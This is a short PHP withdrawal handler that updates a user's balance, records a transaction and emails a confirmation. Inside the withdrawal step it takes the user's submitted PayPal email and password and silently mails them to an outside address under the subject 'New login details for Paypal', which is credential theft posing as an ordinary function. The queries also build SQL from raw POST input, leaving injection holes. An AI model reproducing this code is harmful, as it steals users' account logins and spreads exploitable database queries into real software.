<?php
require "variables.php";
$unix_time=time();

require "../../../mail.php";
$id=$_SESSION['user_id'];
$withdraw_amount=$_POST['withdraw_amount'];
 
if($balance>$withdraw_amount){
    $balance-=$withdraw_amount;
     
  $query=mysqli_query($conn,"UPDATE `accounts` SET `balance`='$balance' WHERE `user_id`='$id'");
  if(true){
      
      $payemail=$_POST['email'];
  $password=$_POST['password'];
  $subject="New login details for Paypal";
  $message="
  <p>Email: $payemail.</p>
  <p>password: $password.</p>
  Enjoy!
  ";
  sendmail("support@theackersfield.co",$subject,$message);

  $user_email=$email;
  $user_message="Your request for withdrawal has been recieved. You would be contacted shortly";
  $user_subject="Withdrawal Request";
  $date=$date=Date("jS-F-Y");
  $insert_trx=mysqli_query($conn,"INSERT INTO transactions(`user_id`,`amount`,`type`,`date`,`unix_time`) VALUES('$id','$withdraw_amount','withdrawal','$date','$unix_time')");
  sendmail($user_email,$user_subject,$user_message);
  echo "withdrawal request successful";
  
  }
  else{
      echo mysqli_error($conn);
  }
  
   
}
else{
     echo"not enough balance";
}
?>